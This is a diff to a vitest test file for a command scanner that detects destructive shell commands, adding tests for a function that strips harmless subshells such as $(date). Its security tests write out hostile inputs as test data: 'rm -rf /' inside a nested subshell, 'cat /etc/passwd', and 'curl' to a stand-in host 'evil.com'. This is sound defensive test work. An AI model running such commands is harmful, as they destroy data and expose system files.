@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { CommandScanner, stripHeredocBodies } from '../src/command-scanner.js';
+import { CommandScanner, stripHeredocBodies, stripSafeSubshells } from '../src/command-scanner.js';
 import type {
   DestructivePatternInput,
   GitActionPatternInput,
@@ -395,5 +395,117 @@ describe('stripHeredocBodies', () => {
     );
     const cmd = 'rm -rf /tmp/dir';
     expect(scanner.isDestructive(cmd)).toBe(true);
+  });
+
+  it('scanner does not fire on $(date) inside gh pr comment body — #1139 dogfood', () => {
+    const scanner = CommandScanner.create(
+      [{ pattern: '\\brm\\s+-rf\\b', description: 'Recursive force delete', riskLevel: 'critical', category: 'filesystem' }],
+      []
+    );
+    const cmd = 'gh pr comment 466 --body "Automated review on $(date -u +%Y-%m-%dT%H:%M:%SZ)"';
+    expect(scanner.isDestructive(cmd)).toBe(false);
+  });
+
+  it('scanner still fires when rm -rf contains a safe subshell', () => {
+    const scanner = CommandScanner.create(
+      [{ pattern: '\\brm\\s+-rf\\b', description: 'Recursive force delete', riskLevel: 'critical', category: 'filesystem' }],
+      []
+    );
+    const cmd = 'rm -rf /tmp/backup-$(date +%Y%m%d)';
+    expect(scanner.isDestructive(cmd)).toBe(true);
+  });
+});
+
+// ─── stripSafeSubshells ───────────────────────────────────────────────────────
+
+describe('stripSafeSubshells', () => {
+  it('returns command unchanged when no subshell present', () => {
+    expect(stripSafeSubshells('gh pr comment 42 --body "hello"')).toBe(
+      'gh pr comment 42 --body "hello"'
+    );
+    expect(stripSafeSubshells('ls -la')).toBe('ls -la');
+    expect(stripSafeSubshells('')).toBe('');
+  });
+
+  it('strips $(date -u +%Y-%m-%dT%H:%M:%SZ) — the exact dogfood case from #1139', () => {
+    const cmd = 'gh pr comment 466 --body "Automated review on $(date -u +%Y-%m-%dT%H:%M:%SZ)"';
+    const result = stripSafeSubshells(cmd);
+    expect(result).not.toContain('$(date');
+    expect(result).toContain('gh pr comment 466 --body');
+  });
+
+  it('strips $(date) with no arguments', () => {
+    expect(stripSafeSubshells('echo $(date)')).toBe('echo ');
+  });
+
+  it('strips $(date +%Y%m%d) with format string', () => {
+    const result = stripSafeSubshells('echo "Today: $(date +%Y%m%d)"');
+    expect(result).not.toContain('$(date');
+  });
+
+  it('strips $(pwd)', () => {
+    expect(stripSafeSubshells('echo "cwd: $(pwd)"')).toBe('echo "cwd: "');
+  });
+
+  it('strips $(whoami)', () => {
+    expect(stripSafeSubshells('echo "user: $(whoami)"')).toBe('echo "user: "');
+  });
+
+  it('strips $(hostname)', () => {
+    const result = stripSafeSubshells('echo "host: $(hostname)"');
+    expect(result).not.toContain('$(hostname');
+  });
+
+  it('strips $(hostname -s)', () => {
+    const result = stripSafeSubshells('echo "short: $(hostname -s)"');
+    expect(result).not.toContain('$(hostname');
+  });
+
+  it('strips $(uname -m)', () => {
+    const result = stripSafeSubshells('echo "arch: $(uname -m)"');
+    expect(result).not.toContain('$(uname');
+  });
+
+  it('strips $(id -u)', () => {
+    const result = stripSafeSubshells('echo "uid: $(id -u)"');
+    expect(result).not.toContain('$(id');
+  });
+
+  it('strips $(arch)', () => {
+    expect(stripSafeSubshells('echo "cpu: $(arch)"')).toBe('echo "cpu: "');
+  });
+
+  it('strips $(uptime)', () => {
+    const result = stripSafeSubshells('echo "up: $(uptime)"');
+    expect(result).not.toContain('$(uptime');
+  });
+
+  it('strips $(git describe --tags)', () => {
+    const result = stripSafeSubshells('gh release create $(git describe --tags)');
+    expect(result).not.toContain('$(git describe');
+  });
+
+  it('strips $(git rev-parse --short HEAD)', () => {
+    const result = stripSafeSubshells('echo "commit: $(git rev-parse --short HEAD)"');
+    expect(result).not.toContain('$(git rev-parse');
+  });
+
+  // ─── Security: nested subshells are NOT stripped ───────────────────────────
+
+  it('does NOT strip $(date $(rm -rf /)) — nested subshell is unsafe', () => {
+    const result = stripSafeSubshells('echo $(date $(rm -rf /))');
+    // The outer $(date ...) contains a nested subshell — must NOT be removed
+    expect(result).toContain('$(date $(rm -rf /))');
+  });
+
+  it('does NOT strip arbitrary $(cmd) subshells', () => {
+    expect(stripSafeSubshells('echo $(cat /etc/passwd)')).toBe('echo $(cat /etc/passwd)');
+    expect(stripSafeSubshells('echo $(curl http://evil.com)')).toBe('echo $(curl http://evil.com)');
+    expect(stripSafeSubshells('echo $(rm -rf /)')).toBe('echo $(rm -rf /)');
+  });
+
+  it('does NOT strip $(git clone ...) — only rev-parse and describe are allowlisted', () => {
+    const cmd = 'echo $(git clone https://github.com/foo/bar)';
+    expect(stripSafeSubshells(cmd)).toBe(cmd);
   });
 });
